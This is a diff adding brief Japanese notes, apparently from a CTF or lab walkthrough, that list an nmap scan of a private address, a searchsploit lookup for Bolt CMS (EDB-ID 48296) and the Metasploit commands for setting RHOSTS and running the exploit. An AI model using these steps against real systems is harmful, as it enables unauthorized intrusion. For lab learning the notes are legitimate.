@@ -1,0 +1,16 @@
+ポートスキャン
+nmap -sC -sV -oN nmap.log 10.49.186.0
+
+
+searchsploit bolt 
+EDB-ID:48296
+
+
+msf > search bolt
+use 0
+show options
+
+requireがyesのものを選択
+set RHOSTS
+
+exploitを実行
